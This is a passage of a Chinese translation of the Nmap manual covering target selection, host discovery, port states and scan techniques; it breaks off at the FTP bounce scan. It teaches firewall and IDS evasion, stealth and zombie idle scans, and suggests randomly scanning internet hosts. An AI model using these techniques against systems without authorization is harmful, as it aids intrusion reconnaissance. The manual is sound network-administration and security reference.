如果您希望Nmap从标准输入而不是实际文件读取列表， 您可以用一个连字符(-)作为文件名。</p><p><strong>-iR<hostnum>(随机选择目标)</hostnum></strong></p><p>对于互联网范围内的调查和研究， 您也许想随机地选择目标。 <em><hostnum></hostnum></em>选项告诉 Nmap生成多少个IP。不合需要的IP如特定的私有，组播或者未分配的地址自动 略过。选项 0 意味着永无休止的扫描。记住，一些网管对于未授权的扫描可能会很感冒并加以抱怨。 使用该选项的后果自负! 如果在某个雨天的下午，您觉得实在无聊， 试试这个命令nmap -sS -PS80 -iR 0 -p 80随机地找一些网站浏览。</p><p><strong>–exclude<host1 [,host2][,host3],...="">(排除主机/网络)</host1></strong></p><p>如果在您指定的扫描范围有一些主机或网络不是您的目标， 那就用该选项加上以逗号分隔的列表排除它们。该列表用正常的Nmap语法， 因此它可以包括主机名，CIDR，八位字节范围等等。 当您希望扫描的网络包含执行关键任务的服务器，已知的对端口扫描反应强烈的 系统或者被其它人看管的子网时，这也许有用。</p><p><strong>–excludefile<excludefile>(排除文件中的列表)</excludefile></strong></p><p>这和–exclude 选项的功能一样，只是所排除的目标是用以 换行符，空格，或者制表符分隔的 <em><excludefile></excludefile></em>提供的，而不是在命令行上输入的。</p><h1 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h1><p>任何网络探测任务的最初几个步骤之一就是把一组IP范围(有时该范围是巨大的)缩小为 一列活动的或者您感兴趣的主机。扫描每个IP的每个端口很慢，通常也没必要。当然，什么样的主机令您感兴趣主要依赖于扫描的目的。网管也许只对运行特定服务的 主机感兴趣，而从事安全的人士则可能对一个马桶都感兴趣，只要它有IP地址:-)。一个系统管理员 也许仅仅使用Ping来定位内网上的主机，而一个外部入侵测试人员则可能绞尽脑汁用各种方法试图突破防火墙的封锁。</p><p>由于主机发现的需求五花八门，Nmap提供了一箩筐的选项来定制您的需求。 主机发现有时候也叫做ping扫描，但它远远超越用世人皆知的ping工具 发送简单的ICMP回声请求报文。用户完全可以通过使用列表扫描(-sL)或者 通过关闭ping (-P0)跳过ping的步骤，也可以使用多个端口把TCP SYN/ACK，UDP和ICMP 任意组合起来玩一玩。这些探测的目的是获得响应以显示某个IP地址是否是活动的(正在被某 主机或者网络设备使用)。 在许多网络上，在给定的时间，往往只有小部分的IP地址是活动的。 这种情况在基于RFC1918的私有地址空间如10.0.0.0/8尤其普遍。那个网络有16,000,000个IP，但我见过一些使用它的公司连1000台机器都没有。主机发现能够找到零星分布于IP地址海洋上的那些机器。</p><p>如果没有给出主机发现的选项，Nmap 就发送一个TCP ACK报文到80端口和一个ICMP回声请求到每台目标机器。 一个例外是ARP扫描用于局域网上的任何目标机器。对于非特权UNIX shell用户，使用connect()系统调用会发送一个SYN报文而不是ACK 这些默认行为和使用-PA -PE选项的效果相同。 扫描局域网时，这种主机发现一般够用了，但是对于安全审核，建议进行 更加全面的探测。</p><p>-P选项(用于选择 ping的类型)可以被结合使用。 您可以通过使用不同的TCP端口/标志位和ICMP码发送许多探测报文 来增加穿透防守严密的防火墙的机会。另外要注意的是即使您指定了其它 -P*选项，ARP发现(-PR)对于局域网上的 目标而言是默认行为，因为它总是更快更有效。</p><p>下列选项控制主机发现。</p><p><strong>-sL (列表扫描)</strong></p><p>列表扫描是主机发现的退化形式，它仅仅列出指定网络上的每台主机， 不发送任何报文到目标主机。默认情况下，Nmap仍然对主机进行反向域名解析以获取 它们的名字。简单的主机名能给出的有用信息常常令人惊讶。例如， fw.chi.playboy.com是花花公子芝加哥办公室的 防火墙。Nmap最后还会报告IP地址的总数。列表扫描可以很好的确保您拥有正确的目标IP。 如果主机的域名出乎您的意料，那么就值得进一步检查以防错误地扫描其它组织的网络。</p><p>既然只是打印目标主机的列表，像其它一些高级功能如端口扫描，操作系统探测或者Ping扫描 的选项就没有了。如果您希望关闭ping扫描而仍然执行这样的高级功能，请继续阅读关于 -P0选项的介绍。</p><p><strong>-sP (Ping扫描)</strong></p><p>该选项告诉Nmap仅仅 进行ping扫描 (主机发现)，然后打印出对扫描做出响应的那些主机。 没有进一步的测试 (如端口扫描或者操作系统探测)。 这比列表扫描更积极，常常用于 和列表扫描相同的目的。它可以得到些许目标网络的信息而不被特别注意到。 对于攻击者来说，了解多少主机正在运行比列表扫描提供的一列IP和主机名往往更有价值。</p><p>系统管理员往往也很喜欢这个选项。 它可以很方便地得出 网络上有多少机器正在运行或者监视服务器是否正常运行。常常有人称它为 地毯式ping，它比ping广播地址更可靠，因为许多主机对广播请求不响应。</p><p>-sP选项在默认情况下， 发送一个ICMP回声请求和一个TCP报文到80端口。如果非特权用户执行，就发送一个SYN报文 (用connect()系统调用)到目标机的80端口。 当特权用户扫描局域网上的目标机时，会发送ARP请求(-PR)， ，除非使用了–send-ip选项。 -sP选项可以和除-P0)之外的任何发现探测类型-P* 选项结合使用以达到更大的灵活性。 一旦使用了任何探测类型和端口选项，默认的探测(ACK和回应请求)就被覆盖了。 当防守严密的防火墙位于运行Nmap的源主机和目标网络之间时， 推荐使用那些高级选项。否则，当防火墙捕获并丢弃探测包或者响应包时，一些主机就不能被探测到。</p><p><strong>-P0 (无ping)</strong></p><p>该选项完全跳过Nmap发现阶段。 通常Nmap在进行高强度的扫描时用它确定正在运行的机器。 默认情况下，Nmap只对正在运行的主机进行高强度的探测如 端口扫描，版本探测，或者操作系统探测。用-P0禁止 主机发现会使Nmap对每一个指定的目标IP地址 进行所要求的扫描。所以如果在命令行指定一个B类目标地址空间(/16)， 所有 65,536 个IP地址都会被扫描。 -P0的第二个字符是数字0而不是字母O。 和列表扫描一样，跳过正常的主机发现，但不是打印一个目标列表， 而是继续执行所要求的功能，就好像每个IP都是活动的。</p><p><strong>-PS [portlist] (TCP SYN Ping)</strong></p><p>该选项发送一个设置了SYN标志位的空TCP报文。 默认目的端口为80 (可以通过改变nmap.h) 文件中的DEFAULT-TCP-PROBE-PORT值进行配置，但不同的端口也可以作为选项指定。 甚至可以指定一个以逗号分隔的端口列表(如 -PS22，23，25，80，113，1050，35000)， 在这种情况下，每个端口会被并发地扫描。</p><p>SYN标志位告诉对方您正试图建立一个连接。 通常目标端口是关闭的，一个RST (复位) 包会发回来。 如果碰巧端口是开放的，目标会进行TCP三步握手的第二步，回应 一个SYN/ACK TCP报文。然后运行Nmap的机器则会扼杀这个正在建立的连接， 发送一个RST而非ACK报文，否则，一个完全的连接将会建立。 RST报文是运行Nmap的机器而不是Nmap本身响应的，因为它对收到 的SYN/ACK感到很意外。</p><p>Nmap并不关心端口开放还是关闭。 无论RST还是SYN/ACK响应都告诉Nmap该主机正在运行。</p><p>在UNIX机器上，通常只有特权用户 root 能否发送和接收 原始的TCP报文。因此作为一个变通的方法，对于非特权用户， Nmap会为每个目标主机进行系统调用connect()，它也会发送一个SYN 报文来尝试建立连接。如果connect()迅速返回成功或者一个ECONNREFUSED 失败，下面的TCP堆栈一定已经收到了一个SYN/ACK或者RST，该主机将被 标志位为在运行。 如果连接超时了，该主机就标志位为down掉了。这种方法也用于IPv6 连接，因为Nmap目前还不支持原始的IPv6报文。</p><p><strong>-PA [portlist] (TCP ACK Ping)</strong></p><p>TCP ACK ping和刚才讨论的SYN ping相当类似。 也许您已经猜到了，区别就是设置TCP的ACK标志位而不是SYN标志位。 ACK报文表示确认一个建立连接的尝试，但该连接尚未完全建立。 所以远程主机应该总是回应一个RST报文， 因为它们并没有发出过连接请求到运行Nmap的机器，如果它们正在运行的话。</p><p>-PA选项使用和SYN探测相同的默认端口(80)，也可以 用相同的格式指定目标端口列表。如果非特权用户尝试该功能， 或者指定的是IPv6目标，前面说过的connect()方法将被使用。 这个方法并不完美，因为它实际上发送的是SYN报文，而不是ACK报文。</p><p>提供SYN和ACK两种ping探测的原因是使通过防火墙的机会尽可能大。 许多管理员会配置他们的路由器或者其它简单的防火墙来封锁SYN报文，除非 连接目标是那些公开的服务器像公司网站或者邮件服务器。 这可以阻止其它进入组织的连接，同时也允许用户访问互联网。 这种无状态的方法几乎不占用防火墙/路由器的资源，因而被硬件和软件过滤器 广泛支持。Linux Netfilter/iptables 防火墙软件提供方便的 –syn选项来实现这种无状态的方法。 当这样的无状态防火墙规则存在时，发送到关闭目标端口的SYN ping探测 (-PS) 很可能被封锁。这种情况下，ACK探测格外有闪光点，因为它正好利用了 这样的规则。</p><p>另外一种常用的防火墙用有状态的规则来封锁非预期的报文。 这一特性已开始只存在于高端防火墙，但是这些年类它越来越普遍了。 Linux Netfilter/iptables 通过 –state选项支持这一特性，它根据连接状态把报文 进行分类。SYN探测更有可能用于这样的系统，由于没头没脑的ACK报文 通常会被识别成伪造的而丢弃。解决这个两难的方法是通过即指定 -PS又指定-PA来即发送SYN又发送ACK。</p><p><strong>-PU [portlist] (UDP Ping)</strong></p><p>还有一个主机发现的选项是UDP ping，它发送一个空的(除非指定了–data-length UDP报文到给定的端口。端口列表的格式和前面讨论过的-PS和-PA选项还是一样。 如果不指定端口，默认是31338。该默认值可以通过在编译时改变nmap.h文件中的 DEFAULT-UDP-PROBE-PORT值进行配置。默认使用这样一个奇怪的端口是因为对开放端口 进行这种扫描一般都不受欢迎。</p><p>如果目标机器的端口是关闭的，UDP探测应该马上得到一个ICMP端口无法到达的回应报文。 这对于Nmap意味着该机器正在运行。 许多其它类型的ICMP错误，像主机/网络无法到达或者TTL超时则表示down掉的或者不可到达的主机。 没有回应也被这样解释。如果到达一个开放的端口，大部分服务仅仅忽略这个 空报文而不做任何回应。这就是为什么默认探测端口是31338这样一个 极不可能被使用的端口。少数服务如chargen会响应一个空的UDP报文， 从而向Nmap表明该机器正在运行。</p><p>该扫描类型的主要优势是它可以穿越只过滤TCP的防火墙和过滤器。 例如。我曾经有过一个Linksys BEFW11S4无线宽带路由器。默认情况下， 该设备对外的网卡过滤所有TCP端口，但UDP探测仍然会引发一个端口不可到达 的消息，从而暴露了它自己。</p><p><strong>-PE; -PP; -PM (ICMP Ping Types)</strong></p><p>除了前面讨论的这些不常见的TCP和UDP主机发现类型， Nmap也能发送世人皆知的ping 程序所发送的报文。Nmap发送一个ICMP type 8 (回声请求)报文到目标IP地址， 期待从运行的主机得到一个type 0 (回声响应)报文。 对于网络探索者而言，不幸的是，许多主机和 防火墙现在封锁这些报文，而不是按期望的那样响应， 参见<a href="http://www.rfc-editor.org/rfc/rfc1122.txt" target="_blank" rel="external">RFC 1122</a>。因此，仅仅ICMP扫描对于互联网上的目标通常是不够的。 但对于系统管理员监视一个内部网络，它们可能是实际有效的途径。 使用-PE选项打开该回声请求功能。</p><p>虽然回声请求是标准的ICMP ping查询， Nmap并不止于此。ICMP标准 (<a href="http://www.rfc-editor.org/rfc/rfc792.txt" target="_blank" rel="external">RFC 792</a>)还规范了时间戳请求，信息请求 request，和地址掩码请求，它们的代码分别是13，15和17。 虽然这些查询的表面目的是获取信息如地址掩码和当前时间， 它们也可以很容易地用于主机发现。 很简单，回应的系统就是在运行的系统。Nmap目前没有实现信息请求报文， 因为它们还没有被广泛支持。RFC 1122 坚持 “主机不应该实现这些消息”。 时间戳和地址掩码查询可以分别用-PP和-PM选项发送。 时间戳响应(ICMP代码14)或者地址掩码响应(代码18)表示主机在运行。 当管理员特别封锁了回声请求报文而忘了其它ICMP查询可能用于 相同目的时，这两个查询可能很有价值。</p><p><strong>-PR (ARP Ping)</strong></p><p>最常见的Nmap使用场景之一是扫描一个以太局域网。在大部分局域网上，特别是那些使用基于 RFC1918私有地址范围的网络，在一个给定的时间绝大部分 IP地址都是不使用的。 当Nmap试图发送一个原始IP报文如ICMP回声请求时， 操作系统必须确定对应于目标IP的硬件地址(ARP)，这样它才能把以太帧送往正确的地址。 这一般比较慢而且会有些问题，因为操作系统设计者认为一般不会在短时间内 对没有运行的机器作几百万次的ARP请求。</p><p>当进行ARP扫描时，Nmap用它优化的算法管理ARP请求。当它收到响应时，Nmap甚至不需要担心基于IP的ping报文，既然它已经知道该主机正在运行了。 这使得ARP扫描比基于IP的扫描更快更可靠。 所以默认情况下，如果Nmap发现目标主机就在它所在的局域网上，它会进行ARP扫描。即使指定了不同的ping类型(如 -PI或者 -PS) ，Nmap也会对任何相同局域网上的目标机使用ARP。 如果您真的不想要ARP扫描，指定 –send-ip。</p><p><strong>-n (不用域名解析)</strong></p><p>告诉Nmap 永不对它发现的活动IP地址进行反向域名解析。既然DNS一般比较慢，这可以让事情更快些。</p><p><strong>-R (为所有目标解析域名)</strong></p><p>告诉Nmap 永远 对目标IP地址作反向域名解析。 一般只有当发现机器正在运行时才进行这项操作。</p><p><strong>–system-dns (使用系统域名解析器)</strong></p><p>默认情况下，Nmap通过直接发送查询到您的主机上配置的域名服务器 来解析域名。为了提高性能，许多请求 (一般几十个 ) 并发执行。如果您希望使用系统自带的解析器，就指定该选项 (通过getnameinfo()调用一次解析一个IP)。除非Nmap的DNS代码有bug–如果是这样，请联系我们。 一般不使用该选项，因为它慢多了。系统解析器总是用于IPv6扫描。</p><h1 id="端口扫描基础"><a href="#端口扫描基础" class="headerlink" title="端口扫描基础"></a>端口扫描基础</h1><p>虽然Nmap这些年来功能越来越多， 它也是从一个高效的端口扫描器开始的，并且那仍然是它的核心功能。 nmap<target>这个简单的命令扫描主机<target>上的超过 1660个TCP端口。 。许多传统的端口扫描器只列出所有端口是开放还是关闭的， Nmap的信息粒度比它们要细得多。 它把端口分成六个状态: open(开放的)， closed(关闭的)，filtered(被过滤的)， unfiltered(未被过滤的)， open|filtered(开放或者被过滤的)，或者 closed|filtered(关闭或者被过滤的)。</target></target></p><p>这些状态并非端口本身的性质，而是描述Nmap怎样看待它们。例如， 对于同样的目标机器的135/tcp端口，从同网络扫描显示它是开放的，而跨网络作完全相同的扫描则可能显示它是 filtered(被过滤的)。</p><p>Nmap所识别的6个端口状态：</p><p><strong>open(开放的)</strong></p><p>应用程序正在该端口接收TCP 连接或者UDP报文。发现这一点常常是端口扫描 的主要目标。安全意识强的人们知道每个开放的端口 都是攻击的入口。攻击者或者入侵测试者想要发现开放的端口。 而管理员则试图关闭它们或者用防火墙保护它们以免妨碍了合法用户。 非安全扫描可能对开放的端口也感兴趣，因为它们显示了网络上那些服务可供使用。</p><p><strong>closed(关闭的)</strong></p><p>关闭的端口对于Nmap也是可访问的(它接受Nmap的探测报文并作出响应)， 但没有应用程序在其上监听。 它们可以显示该IP地址上(主机发现，或者ping扫描)的主机正在运行up 也对部分操作系统探测有所帮助。 因为关闭的关口是可访问的，也许过会儿值得再扫描一下，可能一些又开放了。 系统管理员可能会考虑用防火墙封锁这样的端口。 那样他们就会被显示为被过滤的状态，下面讨论。</p><p><strong>filtered(被过滤的)</strong></p><p>由于包过滤阻止探测报文到达端口， Nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由器规则 或者主机上的软件防火墙。这样的端口让攻击者感觉很挫折，因为它们几乎不提供 任何信息。有时候它们响应ICMP错误消息如类型3代码13 (无法到达目标: 通信被管理员禁止)，但更普遍的是过滤器只是丢弃探测帧， 不做任何响应。 这迫使Nmap重试若干次以访万一探测包是由于网络阻塞丢弃的。 这使得扫描速度明显变慢。</p><p><strong>unfiltered(未被过滤的)</strong></p><p>未被过滤状态意味着端口可访问，但Nmap不能确定它是开放还是关闭。 只有用于映射防火墙规则集的ACK扫描才会把端口分类到这种状态。 用其它类型的扫描如窗口扫描，SYN扫描，或者FIN扫描来扫描未被过滤的端口可以帮助确定 端口是否开放。</p><p><strong>open|filtered(开放或者被过滤的)</strong></p><p>当无法确定端口是开放还是被过滤的，Nmap就把该端口划分成 这种状态。开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃 了探测报文或者它引发的任何响应。因此Nmap无法确定该端口是开放的还是被过滤的。 UDP，IP协议， FIN，Null，和Xmas扫描可能把端口归入此类。</p><p><strong>closed|filtered(关闭或者被过滤的)</strong></p><p>该状态用于Nmap不能确定端口是关闭的还是被过滤的。 它只可能出现在IPID Idle扫描中。</p><h1 id="端口扫描技术"><a href="#端口扫描技术" class="headerlink" title="端口扫描技术"></a>端口扫描技术</h1><p>作为一个修车新手，我可能折腾几个小时来摸索怎样把基本工具(锤子，胶带，扳子等) 用于手头的任务。当我惨痛地失败，把我的老爷车拖到一个真正的技师那儿的时候 ，他总是在他的工具箱里翻来翻去，直到拽出一个完美的工具然后似乎不费吹灰之力搞定它。 端口扫描的艺术和这个类似。专家理解成打的扫描技术，选择最适合的一种 (或者组合)来完成给定的 任务。 另一方面，没有经验的用户和刚入门者总是用默认的SYN扫描解决每个问题。 既然Nmap是免费的，掌握端口扫描的唯一障碍就是知识。这当然是汽车世界所不能比的， 在那里，可能需要高超的技巧才能确定您需要一个压杆弹簧压缩机，接着您还得为它付数千美金。</p><p>大部分扫描类型只对特权用户可用。 这是因为他们发送接收原始报文，这在Unix系统需要root权限。 在Windows上推荐使用administrator账户，但是当WinPcap已经被加载到操作系统时， 非特权用户也可以正常使用Nmap。当Nmap在1997年发布时，需要root权限是一个严重的 局限，因为很多用户只有共享的shell账户。现在，世界变了，计算机便宜了，更多人拥有互联网连接 ，桌面UNIX系统 (包括Linux和MAC OS X)很普遍了。Windows版本的Nmap现在也有了，这使它可以运行在更多的桌面上。 由于所有这些原因，用户不再需要用有限的共享shell账户运行Nmap。 这是很幸运的，因为特权选项让Nmap强大得多也灵活得多。</p><p>虽然Nmap努力产生正确的结果，但请记住所有结果都是基于目标机器(或者它们前面的防火墙)返回的报文的。 。这些主机也许是不值得信任的，它们可能响应以迷惑或误导Nmap的报文。 更普遍的是非RFC兼容的主机以不正确的方式响应Nmap探测。FIN，Null和Xmas扫描 特别容易遇到这个问题。这些是特定扫描类型的问题，因此我们在个别扫描类型里讨论它们。</p><p>这一节讨论Nmap支持的大约十几种扫描技术。 一般一次只用一种方法， 除了UDP扫描(-sU)可能和任何一种TCP扫描类型结合使用。 友情提示一下，端口扫描类型的选项格式是-s<c>， 其中<c>是个显眼的字符，通常是第一个字符。 一个例外是deprecated FTP bounce扫描(-b)。默认情况下，Nmap执行一个 SYN扫描，但是如果用户没有权限发送原始报文(在UNIX上需要root权限)或者如果指定的是IPv6目标，Nmap调用connect()。 本节列出的扫描中，非特权用户只能执行connect()和ftp bounce扫描。</c></c></p><p><strong>-sS (TCP SYN扫描)</strong></p><p>SYN扫描作为默认的也是最受欢迎的扫描选项，是有充分理由的。 它执行得很快，在一个没有入侵防火墙的快速网络上，每秒钟可以扫描数千个 端口。 SYN扫描相对来说不张扬，不易被注意到，因为它从来不完成TCP连接。 它也不像Fin/Null/Xmas，Maimon和Idle扫描依赖于特定平台，而可以应对任何兼容的 TCP协议栈。 它还可以明确可靠地区分open(开放的)， closed(关闭的)，和filtered(被过滤的) 状态</p><p>它常常被称为半开放扫描， 因为它不打开一个完全的TCP连接。它发送一个SYN报文， 就像您真的要打开一个连接，然后等待响应。 SYN/ACK表示端口在监听 (开放)，而 RST (复位)表示没有监听者。如果数次重发后仍没响应， 该端口就被标记为被过滤。如果收到ICMP不可到达错误 (类型3，代码1，2，3，9，10，或者13)，该端口也被标记为被过滤。</p><p><strong>-sT (TCP connect()扫描)</strong></p><p>当SYN扫描不能用时，CP Connect()扫描就是默认的TCP扫描。 当用户没有权限发送原始报文或者扫描IPv6网络时，就是这种情况。 Instead of writing raw packets as most other scan types do，Nmap通过创建connect() 系统调用要求操作系统和目标机以及端口建立连接，而不像其它扫描类型直接发送原始报文。 这是和Web浏览器，P2P客户端以及大多数其它网络应用程序用以建立连接一样的 高层系统调用。它是叫做Berkeley Sockets API编程接口的一部分。Nmap用 该API获得每个连接尝试的状态信息，而不是读取响应的原始报文。</p><p>当SYN扫描可用时，它通常是更好的选择。因为Nmap对高层的 connect()调用比对原始报文控制更少， 所以前者效率较低。 该系统调用完全连接到开放的目标端口而不是像SYN扫描进行 半开放的复位。这不仅花更长时间，需要更多报文得到同样信息，目标机也更可能 记录下连接。IDS(入侵检测系统)可以捕获两者，但大部分机器没有这样的警报系统。 当Nmap连接，然后不发送数据又关闭连接， 许多普通UNIX系统上的服务会在syslog留下记录，有时候是一条加密的错误消息。 此时，有些真正可怜的服务会崩溃，虽然这不常发生。如果管理员在日志里看到来自同一系统的 一堆连接尝试，她应该知道她的系统被扫描了。</p><p>-<strong>sU (UDP扫描)</strong></p><p>虽然互联网上很多流行的服务运行在TCP 协议上，<a href="http://www.rfc-editor.org/rfc/rfc768.txt" target="_blank" rel="external">UDP服务</a>也不少。 DNS，SNMP，和DHCP (注册的端口是53，161/162，和67/68)是最常见的三个。 因为UDP扫描一般较慢，比TCP更困难，一些安全审核人员忽略这些端口。 这是一个错误，因为可探测的UDP服务相当普遍，攻击者当然不会忽略整个协议。 所幸，Nmap可以帮助记录并报告UDP端口。</p><p>UDP扫描用-sU选项激活。它可以和TCP扫描如 SYN扫描 (-sS)结合使用来同时检查两种协议。</p><p>UDP扫描发送空的(没有数据)UDP报头到每个目标端口。 如果返回ICMP端口不可到达错误(类型3，代码3)， 该端口是closed(关闭的)。 其它ICMP不可到达错误(类型3， 代码1，2，9，10，或者13)表明该端口是filtered(被过滤的)。 偶尔地，某服务会响应一个UDP报文，证明该端口是open(开放的)。 如果几次重试后还没有响应，该端口就被认为是 open|filtered(开放|被过滤的)。 这意味着该端口可能是开放的，也可能包过滤器正在封锁通信。 可以用版本扫描(-sV)帮助区分真正的开放端口和被过滤的端口。</p><p>UDP扫描的巨大挑战是怎样使它更快速。 开放的和被过滤的端口很少响应，让Nmap超时然后再探测，以防探测帧或者 响应丢失。关闭的端口常常是更大的问题。 它们一般发回一个ICMP端口无法到达错误。但是不像关闭的TCP端口响应SYN或者Connect 扫描所发送的RST报文，许多主机在默认情况下限制ICMP端口不可到达消息。 Linux和Solaris对此特别严格。例如， Linux 2.4.20内核限制一秒钟只发送一条目标不可到达消息 (见net/ipv4/icmp。c)。</p><p>Nmap探测速率限制并相应地减慢来避免用那些目标机会丢弃的无用报文来阻塞 网络。不幸的是，Linux式的一秒钟一个报文的限制使65,536个端口的扫描要花 18小时以上。加速UDP扫描的方法包括并发扫描更多的主机，先只对主要端口进行快速 扫描，从防火墙后面扫描，使用–host-timeout跳过慢速的 主机。</p><p><strong>-sN; -sF; -sX (TCP Null，FIN，and Xmas扫描)</strong></p><p>这三种扫描类型 (甚至用下一节描述的 –scanflags 选项的更多类型) 在<a href="http://www.rfc-editor.org/rfc/rfc793.txt" target="_blank" rel="external">TCP RFC</a>中发掘了一个微妙的方法来区分open(开放的)和 closed(关闭的)端口。第65页说“如果 [目标]端口状态是关闭的…. 进入的不含RST的报文导致一个RST响应。” 接下来的一页 讨论不设置SYN，RST，或者ACK位的报文发送到开放端口: “理论上，这不应该发生，如果您确实收到了，丢弃该报文，返回。 ”</p><p>如果扫描系统遵循该RFC，当端口关闭时，任何不包含SYN，RST，或者ACK位的报文会导致 一个RST返回，而当端口开放时，应该没有任何响应。只要不包含SYN，RST，或者ACK， 任何其它三种(FIN，PSH，and URG)的组合都行。Nmap有三种扫描类型利用这一点：</p><p><strong>Null扫描 (-sN)</strong></p><p>不设置任何标志位(tcp标志头是0)</p><p><strong>FIN扫描 (-sF)</strong></p><p>只设置TCP FIN标志位。</p><p><strong>Xmas扫描 (-sX)</strong></p><p>设置FIN，PSH，和URG标志位，就像点亮圣诞树上所有的灯一样。</p><p>除了探测报文的标志位不同，这三种扫描在行为上完全一致。 如果收到一个RST报文，该端口被认为是 closed(关闭的)，而没有响应则意味着 端口是open|filtered(开放或者被过滤的)。 如果收到ICMP不可到达错误(类型 3，代号 1，2，3，9，10，或者13)，该端口就被标记为 被过滤的。</p><p>这些扫描的关键优势是它们能躲过一些无状态防火墙和报文过滤路由器。 另一个优势是这些扫描类型甚至比SYN扫描还要隐秘一些。但是别依赖它 – 多数 现代的IDS产品可以发现它们。一个很大的不足是并非所有系统都严格遵循RFC 793。 许多系统不管端口开放还是关闭，都响应RST。 这导致所有端口都标记为closed(关闭的)。 这样的操作系统主要有Microsoft Windows，许多Cisco设备，BSDI，以及IBM OS/400。 但是这种扫描对多数UNIX系统都能工作。这些扫描的另一个不足是 它们不能辨别open(开放的)端口和一些特定的 filtered(被过滤的)端口，从而返回 open|filtered(开放或者被过滤的)。</p><p><strong>-sA (TCP ACK扫描)</strong></p><p>这种扫描与目前为止讨论的其它扫描的不同之处在于 它不能确定open(开放的)或者 open|filtered(开放或者过滤的))端口。 它用于发现防火墙规则，确定它们是有状态的还是无状态的，哪些端口是被过滤的。</p><p>ACK扫描探测报文只设置ACK标志位(除非您使用 –scanflags)。当扫描未被过滤的系统时， open(开放的)和closed(关闭的) 端口 都会返回RST报文。Nmap把它们标记为 unfiltered(未被过滤的)，意思是 ACK报文不能到达，但至于它们是open(开放的)或者 closed(关闭的) 无法确定。不响应的端口 或者发送特定的ICMP错误消息(类型3，代号1，2，3，9，10， 或者13)的端口，标记为 filtered(被过滤的)。</p><p><strong>-sW (TCP窗口扫描)</strong></p><p>除了利用特定系统的实现细节来区分开放端口和关闭端口，当收到RST时不总是打印unfiltered， 窗口扫描和ACK扫描完全一样。 它通过检查返回的RST报文的TCP窗口域做到这一点。 在某些系统上，开放端口用正数表示窗口大小(甚至对于RST报文) 而关闭端口的窗口大小为0。因此，当收到RST时，窗口扫描不总是把端口标记为 unfiltered， 而是根据TCP窗口值是正数还是0，分别把端口标记为open或者 closed</p><p>该扫描依赖于互联网上少数系统的实现细节， 因此您不能永远相信它。不支持它的系统会通常返回所有端口closed。 当然，一台机器没有开放端口也是有可能的。 如果大部分被扫描的端口是 closed，而一些常见的端口 (如 22， 25，53) 是 filtered，该系统就非常可疑了。 偶尔地，系统甚至会显示恰恰相反的行为。 如果您的扫描显示1000个开放的端口和3个关闭的或者被过滤的端口， 那么那3个很可能也是开放的端口。</p><p><strong>-sM (TCP Maimon扫描)</strong></p><p>Maimon扫描是用它的发现者Uriel Maimon命名的。他在 Phrack Magazine issue #49 (November 1996)中描述了这一技术。 Nmap在两期后加入了这一技术。 这项技术和Null，FIN，以及Xmas扫描完全一样，除了探测报文是FIN/ACK。 根据RFC 793 (TCP)，无论端口开放或者关闭，都应该对这样的探测响应RST报文。 然而，Uriel注意到如果端口开放，许多基于BSD的系统只是丢弃该探测报文。</p><p><strong>–scanflags (定制的TCP扫描)</strong></p><p>真正的Nmap高级用户不需要被这些现成的扫描类型束缚。 –scanflags选项允许您通过指定任意TCP标志位来设计您自己的扫描。 让您的创造力流动，躲开那些仅靠本手册添加规则的入侵检测系统！</p><p>–scanflags选项可以是一个数字标记值如9 (PSH和FIN)， 但使用字符名更容易些。 只要是URG， ACK，PSH， RST，SYN，and FIN的任何组合就行。例如，–scanflags URGACKPSHRSTSYNFIN设置了所有标志位，但是这对扫描没有太大用处。 标志位的顺序不重要。</p><p>除了设置需要的标志位，您也可以设置 TCP扫描类型(如-sA或者-sF)。 那个基本类型告诉Nmap怎样解释响应。例如， SYN扫描认为没有响应意味着 filtered端口，而FIN扫描则认为是 open|filtered。 除了使用您指定的TCP标记位，Nmap会和基本扫描类型一样工作。 如果您不指定基本类型，就使用SYN扫描。</p><p><strong>-sI<zombie host[:probeport]="">(Idlescan)</zombie></strong></p><p>这种高级的扫描方法允许对目标进行真正的TCP端口盲扫描 (意味着没有报文从您的真实IP地址发送到目标)。相反，side-channel攻击 利用zombie主机上已知的IP分段ID序列生成算法来窥探目标上开放端口的信息。 IDS系统将显示扫描来自您指定的zombie机(必须运行并且符合一定的标准)。 这种奇妙的扫描类型太复杂了，不能在此完全描述，所以我写一篇非正式的论文， 发布在<a href="https://nmap.org/book/idlescan.html" target="_blank" rel="external">https://nmap.org/book/idlescan.html</a>。</p><p>除了极端隐蔽(由于它不从真实IP地址发送任何报文)， 该扫描类型可以建立机器间的基于IP的信任关系。 端口列表从zombie 主机的角度。显示开放的端口。 因此您可以尝试用您认为(通过路由器/包过滤规则)可能被信任的 zombies扫描目标。</p><p>如果您由于IPID改变希望探测zombie上的特定端口， 您可以在zombie 主机后加上一个冒号和端口号。 否则Nmap会使用默认端口(80)。</p><p><strong>-sO (IP协议扫描)</strong></p><p>IP 协议扫描可以让您确定目标机支持哪些IP协议 (TCP，ICMP，IGMP，等等)。从技术上说，这不是端口扫描 ，既然它遍历的是IP协议号而不是TCP或者UDP端口号。 但是它仍使用 -p选项选择要扫描的协议号， 用正常的端口表格式报告结果，甚至用和真正的端口扫描一样 的扫描引擎。因此它和端口扫描非常接近，也被放在这里讨论。</p><p>除了本身很有用，协议扫描还显示了开源软件的力量。 尽管基本想法非常简单，我过去从没想过增加这一功能也没收到任何对它的请求。 在2000年夏天，Gerhard Rieger孕育了这个想法，写了一个很棒的补丁程序，发送到nmap-hackers邮件列表。 我把那个补丁加入了Nmap，第二天发布了新版本。 几乎没有商业软件会有用户有足够的热情设计并贡献他们的改进。</p><p>协议扫描以和UDP扫描类似的方式工作。它不是在UDP报文的端口域上循环， 而是在IP协议域的8位上循环，发送IP报文头。 报文头通常是空的，不包含数据，甚至不包含所申明的协议的正确报文头 TCP，UDP，和ICMP是三个例外。它们三个会使用正常的协议头，因为否则某些系 统拒绝发送，而且Nmap有函数创建它们。协议扫描不是注意ICMP端口不可到达消息， 而是ICMP 协议不可到达消息。如果Nmap从目标主机收到 任何协议的任何响应，Nmap就把那个协议标记为open。 ICMP协议不可到达 错误(类型 3，代号 2) 导致协议被标记为 closed。其它ICMP不可到达协议(类型 3，代号 1，3，9，10，或者13) 导致协议被标记为 filtered (虽然同时他们证明ICMP是 open )。如果重试之后仍没有收到响应， 该协议就被标记为open|filtered</p><p><strong>-b<ftp relay="" host="">(FTP弹跳扫描)</ftp></strong></p><p>FTP协议的一个有趣特征(<a href="http://www.rfc-editor.org/rfc/rfc959.txt" target="_blank" rel="external">RFC 959</a>) 